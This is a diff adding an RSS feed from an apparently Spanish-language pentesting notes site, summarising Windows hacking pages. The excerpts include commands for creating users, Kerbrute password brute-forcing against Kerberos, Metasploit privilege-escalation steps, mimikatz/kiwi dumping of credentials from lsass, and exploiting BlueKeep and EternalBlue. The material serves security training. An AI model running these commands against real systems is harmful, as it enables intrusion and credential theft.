@@ -1,0 +1,46 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Hacking Windows on GlmbXecurity</title>
+    <link>http://localhost:1313/docs/6---hacking-windows/</link>
+    <description>Recent content in Hacking Windows on GlmbXecurity</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="http://localhost:1313/docs/6---hacking-windows/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title></title>
+      <link>http://localhost:1313/docs/6---hacking-windows/comandos-b%C3%A1sicos/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/docs/6---hacking-windows/comandos-b%C3%A1sicos/</guid>
+      <description>Indice&#xD;#&#xD;Recolectar informacion Usuarios Operaciones con ficheros Networking Compartir ficheros entre maquinas Cheatsheet completa comandos básicos Windows&#xD;#&#xD;Windows Cheatsheet AIO&#xA;Recolectar información&#xD;#&#xD;systeminfo Usuarios&#xD;#&#xD;# Mostrar info del usuario net user &amp;lt;usuario&amp;gt; # Establecer/cambiar contraseña net user &amp;lt;usuario&amp;gt; &amp;lt;contraseña&amp;gt; # Crear usuario net user &amp;lt;usuario&amp;gt; &amp;lt;contraseña&amp;gt; /add Operaciones con ficheros&#xD;#&#xD;dir /A:H (ver ocultos) cd mkdir rmdir copy xcopy /s (copiar directorio y subdirectorios) del move ren C: (Cambiar a disco C) attrib &amp;lt;fichero&amp;gt; (ver los atributos) Networking&#xD;#&#xD;ipconfig /all nslookup &amp;lt;IP o nombre&amp;gt; #Ver puertos a la escucha y conexiones abiertas netstat-an #Ver recursos compartidos net view &amp;lt;IP o nombre equipo o localhost&amp;gt; arp -a Compartir ficheros entre máquinas&#xD;#&#xD;En Windows una opción como curl es certutil.</description>
+    </item>
+    <item>
+      <title></title>
+      <link>http://localhost:1313/docs/6---hacking-windows/enumeracion/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/docs/6---hacking-windows/enumeracion/</guid>
+      <description>Enumerar usuarios Active Directory&#xD;#&#xD;Kerbrute - kerberos&#xD;#&#xD;Kerbrute es una herramienta que realiza ataques de fuerza bruta contra kerberos para enumerar:&#xA;Parejas de usuario/contraseña válidas Usuarios válidos Usuarios sin pre-autenticación requerida python3 kerbrute.py -users users.txt -passwords pass.txt -domain dominio.local -t 100 El parámetro -t 100 : sirve para indicar los hilos&#xA;Impacket&#xD;#&#xD;Con impacket, se puede tratar de enumerar los usuarios en un DC. (guest no se cambia, siempre se utiliza &amp;ldquo;guest&amp;rdquo;)</description>
+    </item>
+    <item>
+      <title></title>
+      <link>http://localhost:1313/docs/6---hacking-windows/escalada-privilegios/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/docs/6---hacking-windows/escalada-privilegios/</guid>
+      <description>Exploit Suggester Metasploit&#xD;#&#xD;En windows, si establecemos una sesión de meterpreter con metasploit, podemos lanzar un módulo para intentar realizar la escalada de privilegios. Una vez estableceida la sesión con la víctima:&#xA;# Mandamos el proceso de la sesión al segundo plano background # buscamos el exploit y lo cargamos search local_exploit_suggester # localizamos la sesión que pusimos en segundo plano sessions -l # cargamos la sesión set SESSION &amp;lt;numero&amp;gt; # lanzar la búsqueda de exploits para la escalada de privilegios run # tendremos una lista de exploits, de los vulnerables, copiamos el exploit, ejemplo: /windows/local/tokenmagic # cargar el exploit, rellenar los campos y lanzar use /windows/local/tokenmagic &amp;ldquo;Manual&amp;rdquo; exploit suggester&#xD;#&#xD;Exploit Suggester .</description>
+    </item>
+    <item>
+      <title></title>
+      <link>http://localhost:1313/docs/6---hacking-windows/explotacion/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/docs/6---hacking-windows/explotacion/</guid>
+      <description>Dumping passwords/hashes&#xD;#&#xD;Para obtener hashes con kiwi o mimikatz es posible que se requieran privilegios elevados&#xA;Módulo kiwi metasploit&#xD;#&#xD;A través de metasploit se puede cargar el módulo kiwi (mimikatz integrado en metasploit). Teniendo una sesión de meterpreter.&#xA;pgrep lsass migrate &amp;lt;PID de lsass&amp;gt; load kiwi ###### PARA VER TODAS LAS OPCIONES ESCRIBIMOS UN &amp;#34;&amp;#39;?&amp;#34; ### OPCIONES INTERESANTES creds_all #si hay alguna en texto plano lo mostrará creds_kerberos password_change lsa_dump_secrets wifi_list Mimikatz&#xD;#&#xD;Otra manera es con mimikatz de manera nativa, se puede subir a través de un meterpreter, o con certutil.</description>
+    </item>
+    <item>
+      <title></title>
+      <link>http://localhost:1313/docs/6---hacking-windows/vulnerabilidades-mas-conocidas/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/docs/6---hacking-windows/vulnerabilidades-mas-conocidas/</guid>
+      <description>BlueKeep&#xD;#&#xD;Vulnerabilidad que afecta a sistemas windows con RDP que permite aconotecer un RCE (CVE-2019-0708) Ya que accede a una parte de la memoria del kernel y nos permite ejecutar código.&#xA;Afecta a:&#xA;XP Vista Windows 7 Windows server 2008 y 2008R2 Explotar BlueKeep con metasploit&#xD;#&#xD;search bluekeep usar Si da error, es por que hay que elegir el target (S.O) de manera manual,. para ello: show targets (y elegir el correspondiente) Eternalblue&#xD;#&#xD;Vulnerabilidad que afecta a sistemas operativos windows relativamente antiguos, (Windows 7, Windows server 2008), que nos permite ejecución remota de comandos.</description>
+    </item>
+  </channel>
+</rss>
